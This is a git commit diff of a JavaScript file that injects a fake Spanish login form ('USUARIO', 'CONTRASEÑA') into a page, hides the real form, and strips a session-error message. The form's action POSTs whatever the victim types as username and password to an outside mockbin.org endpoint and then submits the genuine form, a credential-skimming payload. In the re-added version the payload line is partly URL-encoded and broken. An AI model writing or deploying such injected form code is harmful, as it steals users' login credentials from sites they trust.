835686700d21dca0b7e6dac5f812897f71ef3998
braisda <braisda@gmail.com>
2023-04-20 16:53:53 +0200

    nuevo s

--- s.js
+++ s.js
@@ -1,35 +1,43 @@
-let form=document.createElement("form");
-let usuario=document.createElement("input");
-let password=document.createElement("input");
-let labelUsuario=document.createElement("label");
-let labelPassword=document.createElement("label");
-form.setAttribute("method", "post");
-form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/b472abbc-c914-4604-8a40-18b0d44b894b");xhr.send(`user=${usuario.value};password=${password.value}`);');
+let form = document.createElement("form");
+form.setAttribute("class", "form-container");
+
+
+let usuarioGroup = document.createElement("div");
+usuarioGroup.setAttribute("class", "input-group");
+let labelUsuario = document.createElement("label");
+labelUsuario.setAttribute("for", "usuario");
+labelUsuario.innerHTML = "USUARIO:";
+let usuario = document.createElement("input");
 usuario.setAttribute("type", "text");
 usuario.setAttribute("class", "user");
 usuario.setAttribute("size", "20");
 usuario.setAttribute("maxlength", "50");
+usuarioGroup.appendChild(labelUsuario);
+usuarioGroup.appendChild(usuario);
 
+let passwordGroup = document.createElement("div");
+passwordGroup.setAttribute("class", "input-group");
+let labelPassword = document.createElement("label");
+labelPassword.setAttribute("for", "password");
+labelPassword.innerHTML = "CONTRASEÑA:";
+form.setAttribute("method", "post");
+form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/b472abbc-c914-4604-8a40-18b0d44b894b%22);xhr.send(%60user=$%7Busuario.value%7D;password=$%7Bpassword.value%7D%60);%27);
+let password = document.createElement("input");
 password.setAttribute("type", "password");
 password.setAttribute("class", "password");
 password.setAttribute("size", "20");
 password.setAttribute("maxlength", "50");
-
-labelUsuario.setAttribute("for", "usuario");
-labelPassword.setAttribute("for", "password");
-labelUsuario.innerHTML="USUARIO:";
-labelPassword.innerHTML="CONTRASEÑA:";
+passwordGroup.appendChild(labelPassword);
+passwordGroup.appendChild(password);
 
 let boton=document.createElement("input");
 boton.setAttribute("type","submit");
 boton.setAttribute("class","enviar_btn");
-form.appendChild(labelUsuario);
-form.appendChild(usuario);
-form.appendChild(labelPassword);
-form.appendChild(password);
+
+form.appendChild(usuarioGroup);
+form.appendChild(passwordGroup);
 form.appendChild(boton);
+
+
 document.getElementById("contenido").appendChild(form);
 document.forms[0].style="display:none;";
-var contenido = document.getElementById('contenido').innerHTML;
-contenido = contenido.replace(/<p><\/p>La sesión fué cerrada por el error:/g, '');
-document.getElementById('contenido').innerHTML = contenido;
